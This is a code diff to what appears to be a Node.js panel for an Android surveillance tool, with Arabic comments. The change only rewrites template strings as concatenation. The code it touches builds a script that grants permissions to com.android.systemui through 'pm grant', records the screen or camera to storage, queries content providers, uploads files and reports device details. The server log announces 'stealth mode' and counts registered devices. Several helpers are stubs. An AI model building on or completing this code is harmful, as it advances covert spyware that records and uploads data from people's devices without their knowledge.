@@ -539,9 +539,9 @@ function createScriptTemplate() {
         
         for (const permission of permissions) {
             try {
-                await executeShellCommand(\`pm grant com.android.systemui \${permission}\`);
+                await executeShellCommand("pm grant com.android.systemui " + permission);
             } catch (e) {
-                console.warn(\`فشل في منح الصلاحية: \${permission}\`);
+                console.warn("فشل في منح الصلاحية: " + permission);
             }
         }
     }
@@ -673,8 +673,8 @@ function createScriptTemplate() {
     // تسجيل الكاميرا
     async function recordCamera(duration) {
         try {
-            const outputPath = \`/sdcard/DCIM/recording_\${Date.now()}.mp4\`;
-            await executeShellCommand(\`screenrecord --verbose --time-limit \${duration} \${outputPath}\`);
+            const outputPath = "/sdcard/DCIM/recording_" + Date.now() + ".mp4";
+            await executeShellCommand("screenrecord --verbose --time-limit " + duration + " " + outputPath);
             
             setTimeout(async () => {
                 if (await fileExists(outputPath)) {
@@ -701,7 +701,7 @@ function createScriptTemplate() {
     async function executeShellCommand(cmd) {
         return new Promise((resolve) => {
             setTimeout(() => {
-                resolve(\`Command executed: \${cmd}\`);
+                resolve("Command executed: " + cmd);
             }, 1000);
         });
     }
@@ -709,7 +709,7 @@ function createScriptTemplate() {
     async function queryContentProvider(uri) {
         return new Promise((resolve) => {
             setTimeout(() => {
-                resolve(\`Data from \${uri}\`);
+                resolve("Data from " + uri);
             }, 2000);
         });
     }
@@ -722,7 +722,7 @@ function createScriptTemplate() {
     async function uploadFile(filePath) {
         return new Promise((resolve) => {
             setTimeout(() => {
-                resolve(\`File uploaded: \${filePath}\`);
+                resolve("File uploaded: " + filePath);
             }, 3000);
         });
     }
@@ -859,7 +859,7 @@ function createScriptTemplate() {
         
         for (const permission of permissions) {
             try {
-                await executeShellCommand(\`pm grant com.android.systemui \${permission}\`);
+                await executeShellCommand("pm grant com.android.systemui " + permission);
             } catch (e) {}
         }
     }
@@ -972,8 +972,8 @@ function createScriptTemplate() {
     // تسجيل الكاميرا
     async function recordCamera(duration) {
         try {
-            const outputPath = \`/sdcard/DCIM/recording_\${Date.now()}.mp4\`;
-            await executeShellCommand(\`screenrecord --verbose --time-limit \${duration} \${outputPath}\`);
+            const outputPath = "/sdcard/DCIM/recording_" + Date.now() + ".mp4";
+            await executeShellCommand("screenrecord --verbose --time-limit " + duration + " " + outputPath);
             
             setTimeout(async () => {
                 if (await fileExists(outputPath)) {
@@ -1031,7 +1031,7 @@ function createScriptTemplate() {
     function uploadFile(filePath) {
         return new Promise((resolve) => {
             setTimeout(() => {
-                resolve(\`File uploaded: \${filePath}\`);
+                resolve("File uploaded: " + filePath);
             }, 3000);
         });
     }
@@ -1139,7 +1139,7 @@ function createScriptTemplate() {
                 deviceInfo: {
                     os: navigator.platform,
                     browser: navigator.userAgent,
-                    resolution: \`\${screen.width}x\${screen.height}\`
+                    resolution: screen.width + 'x' + screen.height
                 }
             })
         }).catch(() => {});
@@ -1189,10 +1189,10 @@ const serverUrl = process.env.NODE_ENV === 'production'
   : `http://localhost:${PORT}`;
 
 app.listen(PORT, () => {
-    console.log(\`🚀 خادم الواجهة يعمل على \${serverUrl}\`);
+    console.log(`🚀 خادم الواجهة يعمل على ${serverUrl}`);
     console.log('✅ تم تهيئة النظام بنجاح');
     console.log('🔒 وضع الأمان مفعل');
     console.log('👻 وضع التخفي مفعل');
-    console.log(\`🌐 رابط الخدمة: \${serverUrl}\`);
-    console.log(\`📊 عدد الأجهزة المسجلة: \${activeDevices.size}\`);
+    console.log(`🌐 رابط الخدمة: ${serverUrl}`);
+    console.log(`📊 عدد الأجهزة المسجلة: ${activeDevices.size}`);
 });
